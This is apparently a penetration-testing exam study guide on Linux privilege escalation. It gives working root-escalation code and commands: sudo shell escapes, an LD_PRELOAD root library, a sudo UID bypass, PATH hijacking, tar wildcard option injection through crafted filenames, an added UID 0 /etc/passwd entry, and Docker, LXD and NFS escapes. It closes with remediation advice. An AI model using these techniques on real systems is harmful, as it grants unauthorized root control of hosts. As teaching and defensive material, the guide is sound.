# Domain 2: Linux Privilege Escalation & Post-Exploitation — Study Guide

> **Exam weight:** 10 of each standalone machine's 20 points come from escalating a foothold shell to `root`. Linux privesc is pattern recognition: enumerate thoroughly, match a misconfiguration to a known escalation, verify, execute.

---

## 0. The Escalation Workflow

```text
   [ Low-priv shell ] ─► stabilise (pty) ─► run enumeration
          │
          ▼
   [ Automated sweep ]  linpeas.sh / lse.sh  ── flag findings, DON'T trust blindly
          │
          ▼
   [ Manual verification of each lead ]
       ├── sudo -l            (what can I run as whom?)
       ├── find SUID/SGID     (custom or abusable binaries?)
       ├── getcap -r / 2>/dev/null   (capabilities?)
       ├── pspy64             (what runs on a timer / as root?)
       ├── writable files     (/etc/passwd, cron scripts, service units?)
       └── ss -tulpn          (internal-only services to tunnel?)
          │
          ▼
   [ Match → verify preconditions → execute → confirm id=0 ]
```

Enumeration scripts are leads, not answers. The exam rewards understanding *why* a finding escalates, because you must reproduce and explain it. Transfer `linpeas.sh` via your file-transfer method (Domain 5), but always confirm each finding by hand.

---

## 1. `sudo -l` Abuse

`sudo -l` lists what the current user may run via `sudo`. Three distinct escalation shapes:

### 1.1 GTFOBins — binaries that shell out

Many ordinary binaries can spawn a shell or read/write arbitrary files. If `sudo -l` shows you may run one as root, consult **GTFOBins** for its escape. Conceptually: the binary runs as root, and you abuse a feature (shell escape, file write, library load) to inherit that.

```bash
sudo -l
# e.g. "(root) NOPASSWD: /usr/bin/find"
sudo find . -exec /bin/sh \; -quit      # find's -exec runs a shell as root
# e.g. vim →  sudo vim -c ':!/bin/sh'
# e.g. awk →  sudo awk 'BEGIN{system("/bin/sh")}'
```

### 1.2 `env_keep += LD_PRELOAD` — shared-library injection

If `sudo -l` shows `env_keep+=LD_PRELOAD`, sudo preserves that environment variable. `LD_PRELOAD` forces the dynamic linker to load *your* shared object before any other, and its constructor runs as root.

```c
/* evil.c */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init(){ unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }
```
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so evil.c
sudo LD_PRELOAD=/tmp/evil.so <any-allowed-binary>
```

### 1.3 `CVE-2019-14287` — sudo user-ID bypass

On vulnerable sudo (< 1.8.28), a rule like `(ALL, !root) /bin/bash` meant to *forbid* running as root is bypassed with `-u#-1`, which resolves to UID 0:

```bash
sudo -u#-1 /bin/bash
```

---

## 2. SUID / SGID Binary Auditing

A SUID binary runs with its *owner's* privileges (root) regardless of who launches it. Custom/misconfigured SUID binaries are a top exam vector.

```bash
find / -perm -4000 -type f 2>/dev/null       # SUID
find / -perm -2000 -type f 2>/dev/null       # SGID
```

Ignore the standard set (`passwd`, `sudo`, `mount`); focus on **unusual or custom** binaries. Reverse the logic:

- **`strings ./binary`** — reveals embedded commands, paths, and whether it calls `system()`.
- **`ltrace ./binary`** / **`strace ./binary`** — shows library/syscall calls at runtime (which files/commands it touches).

### 2.1 `$PATH` hijacking (relative-path `system()` call)

If `strings`/`ltrace` shows the binary calls a command by its **bare name** (e.g. `system("service ...")` not `/usr/sbin/service`), the shell resolves it via `$PATH`. Prepend a writable directory holding a malicious binary of that name:

```bash
cd /tmp
echo -e '#!/bin/bash\n/bin/bash -p' > service   # name matches the called command
chmod +x service
export PATH=/tmp:$PATH
/path/to/suid_binary      # runs YOUR "service" as root
```

### 2.2 Shared-object injection

If `strace` shows the SUID binary tries to `open()` a `.so` in a writable or non-existent path, compile a malicious library there with a matching constructor to gain root.

`-p` on bash (`bash -p`) preserves the elevated effective UID — essential when the parent is SUID-root.

---

## 3. Linux Capabilities

Capabilities split root's power into units attachable to binaries, so a non-SUID binary can still hold dangerous privileges.

```bash
getcap -r / 2>/dev/null
```

- **`cap_setuid+ep`** — the binary can call `setuid(0)`. E.g. a Python or Perl with this cap: `./python -c 'import os; os.setuid(0); os.system("/bin/bash")'`.
- **`cap_dac_read_search+ep`** — bypass file *read* permission checks; read `/etc/shadow`, SSH keys, root-only files.
- **`cap_dac_override`** — bypass file *write* checks; edit `/etc/passwd`.
- **`cap_net_admin` / `cap_net_raw`** — network stack control (sniffing, interface config), sometimes a lever toward broader access.

The mechanism to articulate in the report: the capability grants a *specific* root power to a binary that otherwise runs unprivileged, and you drive that power to a shell or a credential read.

---

## 4. Cron Jobs & Scheduled Tasks

Cron jobs frequently run as root on a timer. Three abuse shapes:

```bash
cat /etc/crontab; ls -la /etc/cron.*; cat /var/spool/cron/crontabs/* 2>/dev/null
./pspy64      # watch processes/cron fire WITHOUT needing to read crontab
```

`pspy64` is invaluable: it shows commands (and UIDs) of processes as they spawn, revealing root cron jobs you cannot see in config files.

### 4.1 Writable script run by root cron

If a root cron executes a script you can write, append a reverse shell or `chmod +s /bin/bash` and wait for the next run.

### 4.2 `$PATH` shadowing in cron

Cron's `PATH` often starts with writable dirs or the job calls a bare command. Drop a malicious binary of that name earlier in `PATH`.

### 4.3 Wildcard injection

When a root cron runs a command with a glob (`*`) over a directory you can write to, you smuggle options via filenames, because the shell expands `*` into arguments:

- **`tar`:** `tar cf archive.tar *` → create files named `--checkpoint=1` and `--checkpoint-action=exec=sh payload.sh`; tar interprets them as options and runs your script.
- **`rsync`, `chown`, `chmod`, `7z`:** analogous option-smuggling via crafted filenames.

```bash
cd /writable/dir
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > payload.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh payload.sh'
# when root's `tar cf backup.tar *` runs, payload executes as root
```

---

## 5. Writable `/etc/passwd` and `/etc/shadow`

If `/etc/passwd` is world-writable, append a root-equivalent user with a password hash you control:

```bash
openssl passwd -1 -salt xyz Password123     # make a hash
echo 'hacker:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker        # UID 0
```

If `/etc/shadow` is readable, extract root's hash and crack it offline (`hashcat`/`john`). If `/etc/passwd` has a legacy second-field password or you can blank root's `x`, that is directly abusable.

---

## 6. Internal Services & Pivot Discovery

Enumerate locally-bound services that external scans never saw:

```bash
ss -tulpn          # listening TCP/UDP with owning process
netstat -tulpn
```

A service bound to `127.0.0.1` (e.g. a root-run web admin, a database, Redis) may be exploitable only from on-host — forward it to your attack box (Domain 5) or exploit locally. This is both a privesc and a pivot lead.

---

## 7. Container & Virtualisation Escapes

### 7.1 Docker socket exposure

If `/var/run/docker.sock` is accessible (you are in the `docker` group, or the socket is mounted into a container), you control the Docker daemon — which runs as root. Launch a container mounting the host filesystem:

```bash
docker run -v /:/host -it alpine chroot /host sh    # root on the HOST
```

### 7.2 `--privileged` container escape

A privileged container shares host capabilities and device access. Classic escapes:

- **`release_agent` cgroup escape:** abuse the cgroup `release_agent` to make the *host* execute a script when a cgroup empties.
- **Host disk mount:** the raw host disk device is visible (`/dev/sda*`); mount it and read/write host files directly.

### 7.3 `docker` group / LXD group

Membership in the `docker` or `lxd` group is effectively root:

```bash
# LXD: import a tiny image, launch privileged, mount host root
lxc init alpine r -c security.privileged=true
lxc config device add r host disk source=/ path=/mnt/root recursive=true
lxc start r && lxc exec r /bin/sh    # /mnt/root is the host filesystem as root
```

The reportable root cause is always the same: these groups/sockets grant control of a root-running daemon, so group membership is equivalent to root — a least-privilege violation.

---

## 8. NFS `no_root_squash` (from Domain 1 enumeration)

If you found an export with `no_root_squash` and can mount it as root on *your* machine:

```bash
# On your (root) attack box:
mount -t nfs TARGET:/export /mnt/x
cp /bin/bash /mnt/x/rootbash && chmod +s /mnt/x/rootbash
# On the target (the file is now root-owned + SUID):
/export/rootbash -p       # root shell
```

---

## 9. Defensive & Reporting Takeaways

- **sudo misconfig** → remove `env_keep` for `LD_PRELOAD`, avoid GTFOBins binaries in sudo rules, patch sudo (CVE-2019-14287).
- **SUID sprawl** → remove the SUID bit from custom binaries; call external commands by absolute path; never trust `$PATH`.
- **Capabilities** → grant the narrowest capability needed; audit with `getcap -r /`.
- **Cron** → root jobs must not run user-writable scripts, must set an absolute `PATH`, and must avoid unquoted globs over user-writable dirs.
- **File perms** → `/etc/passwd` and `/etc/shadow` must never be writable; audit world-writable files.
- **Containers** → never mount `docker.sock` into untrusted containers, avoid `--privileged`, treat `docker`/`lxd` group membership as root-equivalent.

---

## Key Command Recap

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
./pspy64
ss -tulpn
cat /etc/passwd /etc/crontab
# escalation confirmations
id; bash -p
```

➡️ **Next:** [Exercises.md](./Exercises.md), then [Quiz_1](./Quiz_1.md) (SUID/caps/sudo), [Quiz_2](./Quiz_2.md) (cron/PATH/wildcard), [Quiz_3](./Quiz_3.md) (containers/NFS/kernel).
